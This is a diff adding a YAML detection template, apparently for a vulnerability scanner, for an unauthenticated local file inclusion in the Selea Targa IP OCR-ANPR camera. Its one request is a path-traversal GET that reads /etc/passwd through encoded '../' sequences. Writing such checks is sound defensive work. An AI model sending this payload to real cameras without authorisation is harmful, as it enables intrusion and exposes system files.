@@ -1,0 +1,22 @@
+id: targa-camera-lfi
+brief:
+    title: Selea Targa IP OCR-ANPR Camera - Local File Inclusion
+    by: gy741
+    level: high
+    about: Selea Targa IP OCR-ANPR camera suffers from an unauthenticated local file inclusion vulnerability because input passed through the Download Archive in Storage page using get_file.php script is not ...
+    label:
+        - targa
+        - lfi
+        - iot
+        - camera
+        - selea
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+      signs:
+        - "on": status
+          status:
+            - 200
